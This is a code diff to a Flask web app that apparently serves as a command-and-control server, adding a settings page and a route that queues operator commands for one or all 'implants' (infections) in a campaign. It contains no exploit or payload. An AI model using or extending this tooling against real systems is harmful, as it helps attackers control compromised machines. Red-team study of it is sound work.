@@ -166,7 +166,16 @@ def ImplantInputPage(cid,iid):
 @login_required
 @app.route ("/<cid>/settings")
 def BaseImplantSettings(cid):
-    return "2"
+    # -- Gather Data for settings:
+    # -- Users + read/write/none
+    # -- Implant List
+    g.setdefault('cid', cid)
+    Users = db.Get_SettingsUsers(cid, current_user.user_email)
+
+    if request.method == "POST":
+        return
+    else:
+        return render_template("CampaignSettings.html", users = Users)
 
 
 @app.route("/<cid>/implant/create", methods=['GET','POST'])
@@ -253,13 +262,21 @@ def ImplantStager(cid):
 
 
 # -- Implant comms -- #
-@app.route("/cmd/<iid>", methods=["POST"])
+@app.route("/cmd/<cid>", methods=["POST"])
 @login_required
-def ImplantCommandRegistration(iid):
+def ImplantCommandRegistration(cid):
     if request.method == "POST":
-        if "cmd" in request.form:
-            print(request.form['cmd'])
-            # Allowed = db.Register_ImplantCommand(current_user.user_email, iid, cmd)
+        print("CID: ",cid,"\nFRM: ",request.form)
+        if "cmd" in request.form and "ImplantSelect" in request.form:
+            # This check if specific implant or ALL implants.
+            ListOfImplantsToExecute = db.Get_ImplantIDFromTitle(cid,request.form['ImplantSelect'], current_user.user_email)
+            for Implants in ListOfImplantsToExecute:
+                print("ALL:",Implants)
+                # print(request.form['cmd'])
+                Imp.AddCommand(current_user.user_email, Implants ,request.form['cmd'])
+            # -- This is a temp measure, to allow the GLOBAL implant to recieve a command, we will tag commands by
+            # --    implant to ensure they are picked up by the correct infection.
+
             return jsonify({"1":2})
     return "000"
 
